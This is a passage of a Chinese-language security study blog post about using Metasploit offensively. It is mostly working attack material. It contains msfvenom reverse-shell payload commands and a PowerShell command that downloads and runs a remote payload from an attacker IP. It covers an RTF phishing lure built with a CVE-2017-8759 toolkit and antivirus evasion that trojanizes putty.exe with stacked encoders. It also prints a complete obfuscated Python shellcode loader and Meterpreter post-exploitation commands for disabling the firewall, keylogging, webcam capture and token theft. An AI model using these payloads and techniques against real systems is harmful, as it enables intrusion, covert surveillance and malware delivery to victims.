+<h5 id="payload脚本文件-（木马）"><a href="#payload脚本文件-（木马）" class="headerlink" title="payload脚本文件 （木马）"></a>payload脚本文件 （木马）</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">PHP</span><br><span class="line">msfvenom -p php/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &#x27;&lt;?php &#x27; | tr -d &#x27;\n&#x27; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br><span class="line"></span><br><span class="line">ASP</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br><span class="line"></span><br><span class="line">JSP</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br><span class="line"></span><br><span class="line">WAR</span><br><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.war</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<h5 id="powershell-配合msf无文件攻击"><a href="#powershell-配合msf无文件攻击" class="headerlink" title="powershell 配合msf无文件攻击"></a>powershell 配合msf无文件攻击</h5><blockquote>
+<p>msfvenom 生成ps1 的payload —-&gt; 把可执行脚本文件放入自己服务器上 —&gt; 目标服务器使用命令远程加载payload </p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.8.136 LPORT=1133 -f psh-reflection &gt;x.ps1</span><br><span class="line"></span><br><span class="line">设置侦听</span><br><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">Set lhost 192.168.8.136</span><br><span class="line">set lport 1133</span><br><span class="line">Run</span><br></pre></td></tr></table></figure>
+
+<p>需要把生成的x.ps1脚本上传到公网服务器上</p>
+<p>客户端允许</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell IEX (New-Object Net.WebClient).DownloadString(&#x27;http://192.168.18.4/x.ps1&#x27;)</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="Powershell-配合world-伪装木马执行"><a href="#Powershell-配合world-伪装木马执行" class="headerlink" title="Powershell 配合world 伪装木马执行"></a>Powershell 配合world 伪装木马执行</h5><p>win+f9 快捷键</p>
+<p><img src="https://i0.hdslb.com/bfs/album/a1cd913019ad55bbdb09b3857447a3bbddb27f96.png" alt="image-20211222213057078"></p>
+<h5 id="msf宏钓鱼"><a href="#msf宏钓鱼" class="headerlink" title="msf宏钓鱼"></a>msf宏钓鱼</h5><ul>
+<li><p>生成rtf文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 cve-2017-8759_toolkit.py -M gen -w re.rtf -u http://192.168.8.136/logo.txt </span><br></pre></td></tr></table></figure></li>
+<li><p>生成payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.136 lport=1155 -f exe &gt;shell.exe</span><br></pre></td></tr></table></figure></li>
+<li><p>捆绑  监听80端口（就是当用户打开rtf文件时会引入一个链接，该链接为shell.exe 木马程序 ）</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python2 cve-2017-8759_toolkit.py -M exp -e http://192.168.8.136/shell.exe -l shell.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/357d9441101fbc04e2f1bb3f788eff662de843c0.png" alt="image-20211222215354933"></p>
+</li>
+<li><p>msf开启监听</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line">set payload windows/x64/meterpreter/reverse_tcp</span><br><span class="line">Set lhost 192.168.8.136</span><br><span class="line">set lport 1155</span><br><span class="line">Run</span><br></pre></td></tr></table></figure>
+
+<p>把 生成的rtf 文件发给目标，当它点击时，就会反弹shell</p>
+<p><img src="https://i0.hdslb.com/bfs/album/c05fee72b3ec64a19f073e4df79caadba9f95363.png" alt="image-20211222215711858"></p>
+<p><img src="https://i0.hdslb.com/bfs/album/8d20ba35d07a617ba8b479f24c280d73c7b39e79.png" alt="image-20211222215732979"></p>
+<p><img src="https://i0.hdslb.com/bfs/album/f0b21874a008a81e339585bd3f2da95d2eddd3ad.png" alt="image-20211222215827707"></p>
+</li>
+</ul>
+<h5 id="内网穿透"><a href="#内网穿透" class="headerlink" title="内网穿透"></a>内网穿透</h5><p>使用*<a target="_blank" rel="noopener" href="https://ngrok.cc/">ngrock</a>*穿透内网</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">设置ngrock隧道</span><br><span class="line"></span><br><span class="line">本机安装客户端</span><br><span class="line">./sunny clientid  id号</span><br><span class="line"></span><br><span class="line">msf 监听ip需要设置 127.0.0.1 </span><br></pre></td></tr></table></figure>
+
+<h5 id="免杀"><a href="#免杀" class="headerlink" title="免杀"></a>免杀</h5><ul>
+<li><p><strong>Msf5-Evasion模块免杀</strong></p>
+<p>msf自带了免杀模块  (不过这些基本已出来就被杀软识别了，意义不大)</p>
+<p><img src="https://i0.hdslb.com/bfs/album/5de03314eced89486fe9913b57d3637d4cf61db1.png" alt="image-20211222220956608"></p>
+</li>
+<li><p><strong>捆绑免杀</strong></p>
+<p>找系统软件，把payload塞进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.136 lport=1155 -x putty.exe -f exe -o putt.exe</span><br></pre></td></tr></table></figure>
+
+<p>捆绑编码免杀</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.136 lport=1188 -e x86/shikata_ga_nai -i 15 -x putty.exe -f exe -o putt.exe</span><br></pre></td></tr></table></figure>
+
+<p>多重编码 </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp -e x86/call4_dword_xor -i 14 LHOST=192.168.8.136 LPORT=1199 -f raw | msfvenom -a x86 --platform windows -e x86/countdown -i 13 -f raw | msfvenom -a x86 --platform windows -e x86/shikata_ga_nai -b &quot;&amp;&quot; -i 4 -f raw | msfvenom -a x86 --platform windows -e cmd/powershell_base64 -i 10 -x putty.exe -k -f exe &gt; shell.exe</span><br></pre></td></tr></table></figure></li>
+<li><p><strong>使用免杀软件进行免杀</strong></p>
+<p><a target="_blank" rel="noopener" href="https://www.shellterproject.com/download/">shellter免杀软件</a></p>
+<p><img src="https://i0.hdslb.com/bfs/album/a70312ba7b6ad770575417577890bb24194553a4.png" alt="image-20211222223749553"></p>
+<p><img src="https://i0.hdslb.com/bfs/album/299722755a3898e39f89953acf75a05ac0386a32.png" alt="image-20211222223614514"></p>
+</li>
+<li><p><strong>msf 配合py文件 免杀</strong></p>
+</li>
+</ul>
+<blockquote>
+<p>这里没有利用成功</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生成py文件</span><br><span class="line">msfVENOM -p windows/x64/meterpreter/reverse_tcp LPORT=10003 LHOST=119.28.66.234  -e x86/shikata_ga_nai -i 17 -f py -o  /root/121.py</span><br><span class="line"></span><br><span class="line">msf建立监听</span><br></pre></td></tr></table></figure>
+
+<p>对生成的py文件进行处理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br></pre></td><td class="code"><pre><span class="line">from ctypes import *</span><br><span class="line">import ctypes</span><br><span class="line">import sys, os, hashlib, time, base64</span><br><span class="line"></span><br><span class="line">def rc4(string, op=&#x27;encode&#x27;, public_key=&#x27;ddd&#x27;, expirytime=0):</span><br><span class="line">    ckey_lenth = 4</span><br><span class="line">    public_key = public_key and public_key or &#x27;&#x27;</span><br><span class="line">    key = hashlib.md5(public_key).hexdigest()</span><br><span class="line">    keya = hashlib.md5(key[0:16]).hexdigest()</span><br><span class="line">    keyb = hashlib.md5(key[16:32]).hexdigest()</span><br><span class="line">    keyc = ckey_lenth and (op == &#x27;decode&#x27; and string[0:ckey_lenth] or hashlib.md5(str(time.time())).hexdigest()[32 - ckey_lenth:32]) or &#x27;&#x27;</span><br><span class="line">    cryptkey = keya + hashlib.md5(keya + keyc).hexdigest()</span><br><span class="line">    key_lenth = len(cryptkey)  # 64</span><br><span class="line">    string = op == &#x27;decode&#x27; and base64.b64decode(string[4:]) or &#x27;0000000000&#x27; + hashlib.md5(string + keyb).hexdigest()[0:16] + string</span><br><span class="line">    string_lenth = len(string)</span><br><span class="line">    result = &#x27;&#x27;</span><br><span class="line">    box = list(range(256))</span><br><span class="line">    randkey = []</span><br><span class="line">    for i in xrange(255):</span><br><span class="line">        randkey.append(ord(cryptkey[i % key_lenth]))</span><br><span class="line">    for i in xrange(255):</span><br><span class="line">        j = 0</span><br><span class="line">        j = (j + box[i] + randkey[i]) % 256</span><br><span class="line">        tmp = box[i]</span><br><span class="line">        box[i] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">    for i in xrange(string_lenth):</span><br><span class="line">        a = j = 0</span><br><span class="line">        a = (a + 1) % 256</span><br><span class="line">        j = (j + box[a]) % 256</span><br><span class="line">        tmp = box[a]</span><br><span class="line">        box[a] = box[j]</span><br><span class="line">        box[j] = tmp</span><br><span class="line">        result += chr(ord(string[i]) ^ (box[(box[a] + box[j]) % 256]))</span><br><span class="line">    if op == &#x27;decode&#x27;:</span><br><span class="line">        if (result[0:10] == &#x27;0000000000&#x27; or int(result[0:10]) - int(time.time()) &gt; 0) and result[10:26] == hashlib.md5(</span><br><span class="line">                result[26:] + keyb).hexdigest()[0:16]:</span><br><span class="line">            return result[26:]</span><br><span class="line">        else:</span><br><span class="line">            return None</span><br><span class="line">    else:</span><br><span class="line">        return keyc + base64.b64encode(result)</span><br><span class="line"></span><br><span class="line">// 生成的py文件内容  </span><br><span class="line">buf =  &quot;&quot;</span><br><span class="line">buf += &quot;\xfc\xe8\x82\x00\x00\x00\x60\x89\xe5\x31\xc0\x64\x8b&quot;</span><br><span class="line">buf += &quot;\x50\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7&quot;</span><br><span class="line">buf += &quot;\x4a\x26\x31\xff\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf&quot;</span><br><span class="line">buf += &quot;\x0d\x01\xc7\xe2\xf2\x52\x57\x8b\x52\x10\x8b\x4a\x3c&quot;</span><br><span class="line">buf += &quot;\x8b\x4c\x11\x78\xe3\x48\x01\xd1\x51\x8b\x59\x20\x01&quot;</span><br><span class="line">buf += &quot;\xd3\x8b\x49\x18\xe3\x3a\x49\x8b\x34\x8b\x01\xd6\x31&quot;</span><br><span class="line">buf += &quot;\xff\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf6\x03\x7d&quot;</span><br><span class="line">buf += &quot;\x36\x6a\x40\x68\x00\x10\x00\x00\x56\x6a\x00\x68\x58&quot;</span><br><span class="line">buf += &quot;\xa4\x53\xe5\xff\xd5\x93\x53\x6a\x00\x56\x53\x57\x68&quot;</span><br><span class="line">buf += &quot;\x02\xd9\xc8\x5f\xff\xd5\x83\xf8\x00\x7d\x28\x58\x68&quot;</span><br><span class="line">buf += &quot;\x00\x40\x00\x00\x6a\x00\x50\x68\x0b\x2f\x0f\x30\xff&quot;</span><br><span class="line">buf += &quot;\xd5\x57\x68\x75\x6e\x4d\x61\xff\xd5\x5e\x5e\xff\x0c&quot;</span><br><span class="line">buf += &quot;\x24\x0f\x85\x70\xff\xff\xff\xe9\x9b\xff\xff\xff\x01&quot;</span><br><span class="line">buf += &quot;\xc3\x29\xc6\x75\xc1\xc3\xbb\xf0\xb5\xa2\x56\x6a\x00&quot;</span><br><span class="line">buf += &quot;\x53\xff\xd5&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">buf=rc4(buf,&#x27;encode&#x27;,&#x27;6666666666666&#x27;)</span><br><span class="line"></span><br><span class="line"># libc = CDLL(&#x27;libc.so.6&#x27;)</span><br><span class="line">PROT_READ = 1</span><br><span class="line">PROT_WRITE = 2</span><br><span class="line">PROT_EXEC = 4</span><br><span class="line">def executable_code(buffer):</span><br><span class="line">    buf = c_char_p(buffer)</span><br><span class="line">    size = len(buffer)</span><br><span class="line">    addr = libc.valloc(size)</span><br><span class="line">    addr = c_void_p(addr)</span><br><span class="line">    if 0 == addr:</span><br><span class="line">        raise Exception(&quot;Failed to allocate memory&quot;)</span><br><span class="line">    memmove(addr, buf, size)</span><br><span class="line">    if 0 != libc.mprotect(addr, len(buffer), PROT_READ | PROT_WRITE | PROT_EXEC):</span><br><span class="line">        raise Exception(&quot;Failed to set protection on buffer&quot;)</span><br><span class="line">    return addr</span><br><span class="line"></span><br><span class="line">VirtualAlloc = ctypes.windll.kernel32.VirtualAlloc</span><br><span class="line">VirtualProtect = ctypes.windll.kernel32.VirtualProtect</span><br><span class="line">shellcode = bytearray(rc4(buf, &#x27;decode&#x27;, &#x27;6666666666666&#x27;))</span><br><span class="line">whnd = ctypes.windll.kernel32.GetConsoleWindow()</span><br><span class="line">if whnd != 0:</span><br><span class="line">    if 666 == 666:</span><br><span class="line">        ctypes.windll.user32.ShowWindow(whnd, 0)</span><br><span class="line">        ctypes.windll.kernel32.CloseHandle(whnd)</span><br><span class="line">memorywithshell = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0),</span><br><span class="line">                                                      ctypes.c_int(len(shellcode)),</span><br><span class="line">                                                      ctypes.c_int(0x3000),</span><br><span class="line">                                                      ctypes.c_int(0x40))</span><br><span class="line">buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)</span><br><span class="line">old = ctypes.c_long(1)</span><br><span class="line">VirtualProtect(memorywithshell, ctypes.c_int(len(shellcode)), 0x40, ctypes.byref(old))</span><br><span class="line">ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(memorywithshell),</span><br><span class="line">                                     buf,</span><br><span class="line">                                     ctypes.c_int(len(shellcode)))</span><br><span class="line">shell = cast(memorywithshell, CFUNCTYPE(c_void_p))</span><br><span class="line">shell()</span><br></pre></td></tr></table></figure>
+
+<p>使用pyinstaller 打包成exe </p>
+<p>运行上线 </p>
+<h3 id="msf后渗透模块"><a href="#msf后渗透模块" class="headerlink" title="msf后渗透模块"></a>msf后渗透模块</h3><blockquote>
+<p>payload在目标机器执行成功后会建立 meterpreter 会话。 此会话可以执行很多牛逼操作如（添加一个用户、隐藏一些东西、打开shell、得到用户密码、上传下载远程主机的文件、运行cmd.exe、捕捉屏幕、得到远程控制权、捕获按键信息、清除应用程序、显示远程主机的系统信息、显示远程机器的网络接口和IP地址等信息。）</p>
+</blockquote>
+<p>前提看payload</p>
+<ol>
+<li>看权限</li>
+<li>看payload所用脚本协议</li>
+</ol>
+<p>php/meterpreter/reverse_tcp  这个为php脚本的payload。 权限为网络的，执行的操作就<u><em><strong>少</strong></em></u></p>
+<p>windows/meterpreter/reverse_tcp 这个为系统payload，权限为系统的，执行的操作***<u>多</u>***</p>
+<h5 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">进程迁移：</span><br><span class="line">	migrate pid </span><br><span class="line">通过shell关闭防火墙：</span><br><span class="line">	netsh advfirewall set allprofiles state off</span><br><span class="line">查看目标机所有流量</span><br><span class="line">	run packetrecorder -i 1 </span><br><span class="line">提取系统信息</span><br><span class="line">	run scraper </span><br><span class="line">查看进程</span><br><span class="line">	ps</span><br><span class="line">屏幕截屏</span><br><span class="line">	screenshot</span><br><span class="line">获取系统运行平台</span><br><span class="line">	sysinfo </span><br><span class="line">查看桌面</span><br><span class="line">	run vnc</span><br><span class="line">开启目标机器上的远程服务</span><br><span class="line">	run getgui -e</span><br><span class="line">执行目标机器上的程序</span><br><span class="line">	execute -f 程序名</span><br><span class="line">	execute -f calc.exe</span><br><span class="line">	execute -H -f 程序名 #在后台执行</span><br><span class="line">摄像头命令</span><br><span class="line">	record_mic 音频录制</span><br><span class="line">	webcam_chat 查看摄像头</span><br><span class="line">	webcam_list 查看摄像头列表</span><br><span class="line">	webcam_stream 摄像头视频获取</span><br><span class="line">键盘记录</span><br><span class="line">	keyscan_start 开启键盘记录</span><br><span class="line">	keyscan_dump 显示捕捉到的键盘记录信息</span><br><span class="line">	keyscan_stop 暂停键盘记录</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="基本操作命令"><a href="#基本操作命令" class="headerlink" title="基本操作命令"></a>基本操作命令</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">查看文件内容(文件必须存在)</span><br><span class="line">	cat c:\\boot.ini </span><br><span class="line">删除指定文件</span><br><span class="line">	del c:\\boot.ini </span><br><span class="line">	rm c:\\boot.ini</span><br><span class="line">编辑创建文件</span><br><span class="line">	edit 文件名</span><br><span class="line">在受害者机器上创建目录</span><br><span class="line">	mkdir 目录名</span><br><span class="line">在受害者机器上删除目录</span><br><span class="line">	rmdir 目录名</span><br><span class="line">修改目标主机上的文件名</span><br><span class="line">	mv 文件名 新文件名</span><br><span class="line">搜索文件</span><br><span class="line">	search -d 绝对路径 -f 文件名</span><br><span class="line">	search -d c:\\ -f *.doc</span><br><span class="line">更改路径</span><br><span class="line">	cd c:\\</span><br><span class="line">查看当前路径</span><br><span class="line">	pwd</span><br><span class="line">列出当前目录所有文件</span><br><span class="line">	ls</span><br><span class="line">上传文件到目标主机上</span><br><span class="line">	upload 本机路径 目标系统路径</span><br><span class="line">	upload  setup.exe C:\\windows\\system32\</span><br><span class="line">下载文件到本地</span><br><span class="line">	download 目标系统文件 本机路径</span><br><span class="line">	download nimeia.txt /root/Desktop/   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h5><blockquote>
+<p>把目标的3389 转发到vps的端口上，即可通过连接vps的端口，达到连接目标3389的效果</p>
+</blockquote>
+<p><img src="https://i0.hdslb.com/bfs/album/3f906e96145fc40e1904ac30f716d2111e64e53d.png" alt="portfwd"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">meterpreter&gt;portfwd add -l 33889 -p 3389 -r 127.0.0.1</span><br></pre></td></tr></table></figure>
+
+<p>意识是把目标机器的3389，转发到vps的3333端口上</p>
+<p>本机连接vps的3333端口</p>
+<p><img src="https://i0.hdslb.com/bfs/album/bfb6dae489999f95b1b7dab7d68c39762d2ecacf.jpg" alt="Inkedbc772750e079a299d27373a6f3083924e913e727"></p>
+<p>成功连接目标服务器</p>
+<h5 id="盗取令牌"><a href="#盗取令牌" class="headerlink" title="盗取令牌"></a>盗取令牌</h5><blockquote>
+<p>查看可以令牌之后，盗取它，达到提取的效果</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">use incognito //加载incoginto功能（用来盗窃目标主机的令牌 或 假冒用户身份)</span><br><span class="line">list_tokens -u //查看目标主机上用户可以用的令牌</span><br><span class="line">list_tokens -g //查看目标主机上用户组可以用的令牌</span><br><span class="line">impersonate_token &quot;令牌&quot; // 假冒目标主机上的可用令牌</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/bf72d05de02957236eff992ace9443cdc96296d0.png" alt="image-20211228220320100"></p>
+
+      </div>
+      
+        <div class="prev-or-next">
+          <div class="post-foot-next">
+            
+              <a href="/2021/12/18/crecar%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/2-%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" target="_self">
+                <i class="iconfont icon-chevronleft"></i>
+                <span>上一页</span>
+              </a>
+            
+          </div>
+          <div class="post-attach">
+            <span class="post-pubtime">
+              <i class="iconfont icon-updatetime" title="更新时间"></i>
+              2021-12-28 22:08:00
+            </span>
+            
+                  <span class="post-tags">
+                    <i class="iconfont icon-tags" title="标签"></i>
+                    
+                    <span class="span--tag">
+                      <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记">
+                        <b>#</b> 学习笔记
+                      </a>
+                    </span>
+                    
+                  </span>
+              
+          </div>
+          <div class="post-foot-prev">
+            
+              <a href="/2022/01/01/crecar%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/4.access%E6%B3%A8%E5%85%A5/" target="_self">
+                <span>下一页</span>
+                <i class="iconfont icon-chevronright"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+    </div>
+    
+  <div id="btn-catalog" class="btn-catalog">
+    <i class="iconfont icon-catalog"></i>
+  </div>
+  <div class="post-catalog hidden" id="catalog">
+    <div class="title">目录</div>
+    <div class="catalog-content">
+      <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E5%9F%BA%E6%9C%AC%E6%9C%AF%E8%AF%AD"><span class="toc-text">msf基本术语</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-text">msf信息收集</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F%E6%A8%A1%E5%9D%97"><span class="toc-text">端口扫描模块</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%89%B9%E5%AE%9A%E6%9C%8D%E5%8A%A1%E6%89%AB%E6%8F%8F"><span class="toc-text">特定服务扫描</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#smb%E7%89%88%E6%9C%AC%E6%8E%A2%E6%B5%8B"><span class="toc-text">smb版本探测</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8Bmssql%E4%B8%BB%E6%9C%BA"><span class="toc-text">探测mssql主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8Bssh%E6%9C%8D%E5%8A%A1"><span class="toc-text">探测ssh服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8Btelnet-%E6%9C%8D%E5%8A%A1"><span class="toc-text">探测telnet 服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8BFTP%E6%9C%8D%E5%8A%A1"><span class="toc-text">探测FTP服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%ABFTP%E5%8C%BF%E5%90%8D%E7%99%BB%E5%BD%95"><span class="toc-text">扫FTP匿名登录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E5%B1%80%E5%9F%9F%E7%BD%91%E5%86%85%E5%AD%98%E6%B4%BB%E7%9A%84%E4%B8%BB%E6%9C%BA"><span class="toc-text">扫描局域网内存活的主机</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E7%AB%99%E7%9B%AE%E5%BD%95"><span class="toc-text">扫描网站目录</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E6%8E%A2%E6%B5%8B%E7%BD%91%E7%AB%99email%E5%9C%B0%E5%9D%80"><span class="toc-text">探测网站email地址</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#psnuffle%E5%97%85%E6%8E%A2"><span class="toc-text">psnuffle嗅探</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#msf%E6%9A%B4%E5%8A%9B%E7%A0%B4%E8%A7%A3"><span class="toc-text">msf暴力破解</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#ssh%E6%9C%8D%E5%8A%A1"><span class="toc-text">ssh服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#ftp%E6%9C%8D%E5%8A%A1"><span class="toc-text">ftp服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#mysql%E6%9C%8D%E5%8A%A1"><span class="toc-text">mysql服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#postgresql%E6%9C%8D%E5%8A%A1"><span class="toc-text">postgresql服务</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" 